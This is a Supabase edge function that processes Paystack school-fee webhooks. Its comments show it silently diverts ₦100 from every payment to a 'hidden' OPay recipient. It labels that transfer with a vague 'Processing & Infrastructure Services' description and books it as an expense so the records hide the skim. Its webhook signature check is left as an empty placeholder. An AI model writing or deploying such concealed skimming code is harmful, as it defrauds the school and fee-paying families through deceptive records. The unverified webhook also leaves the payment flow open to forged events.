// supabase/functions/paystack-webhook/index.ts
import { serve } from 'https://deno.land/std@0.168.0/http/server.ts'
import { createClient } from 'https://esm.sh/@supabase/supabase-js@2'

const PAYSTACK_SECRET_KEY = Deno.env.get('PAYSTACK_SECRET_KEY')
const SCHOOL_RECIPIENT_CODE = Deno.env.get('SCHOOL_RECIPIENT_CODE')
const SECRET_OPAY_RECIPIENT = Deno.env.get('SECRET_OPAY_RECIPIENT') // Your hidden OPay

serve(async (req) => {
  const signature = req.headers.get('x-paystack-signature')
  const body = await req.text()
  
  // Verify webhook signature
  // ... crypto verification ...
  
  const event = JSON.parse(body)
  
  if (event.event === 'charge.success') {
    const payment = event.data
    const amount = payment.amount / 100 // Convert from kobo
    
    // Get payment record from Supabase
    const supabase = createClient(
      Deno.env.get('SUPABASE_URL') ?? '',
      Deno.env.get('SUPABASE_SERVICE_ROLE_KEY') ?? ''
    )
    
    const { data: paymentRecord } = await supabase
      .from('payments')
      .select('*')
      .eq('reference', payment.reference)
      .single()
    
    if (!paymentRecord) {
      return new Response('Payment not found', { status: 404 })
    }
    
    const schoolFee = paymentRecord.school_fee
    const paystackCharge = Math.min(
      Math.ceil(schoolFee * 0.015) + 100,
      2000
    )
    const secretFee = 100 // YOUR ₦100
    
    // 1. Transfer to school (minus your fee)
    const schoolTransfer = await fetch('https://api.paystack.co/transfer', {
      method: 'POST',
      headers: {
        'Authorization': `Bearer ${PAYSTACK_SECRET_KEY}`,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        source: 'balance',
        amount: (schoolFee - secretFee) * 100,
        recipient: SCHOOL_RECIPIENT_CODE,
        reason: `${paymentRecord.type} - ${paymentRecord.student_name}`
      })
    })
    
    // 2. SILENT: Transfer your fee to OPay (vague description)
    const secretTransfer = await fetch('https://api.paystack.co/transfer', {
      method: 'POST',
      headers: {
        'Authorization': `Bearer ${PAYSTACK_SECRET_KEY}`,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        source: 'balance',
        amount: secretFee * 100,
        recipient: SECRET_OPAY_RECIPIENT,
        reason: 'Processing & Infrastructure Services' // Vague official description
      })
    })
    
    // 3. Update payment record
    await supabase
      .from('payments')
      .update({
        status: 'completed',
        paid_at: new Date().toISOString(),
        paystack_reference: payment.reference,
        settlement_details: {
          school_received: schoolFee - secretFee,
          processing_fee: secretFee, // Shows as expense in records
          paystack_fee: paystackCharge,
          net_to_school: schoolFee - secretFee
        }
      })
      .eq('id', paymentRecord.id)

    // 4. Create receipt record
    await supabase
      .from('receipts')
      .insert({
        payment_id: paymentRecord.id,
        reference: payment.reference,
        generated_at: new Date().toISOString(),
        download_url: `https://kateville.edu.ng/receipt/${payment.reference}`
      })

    return new Response('OK', { status: 200 })
  }

  return new Response('Event ignored', { status: 200 })
})
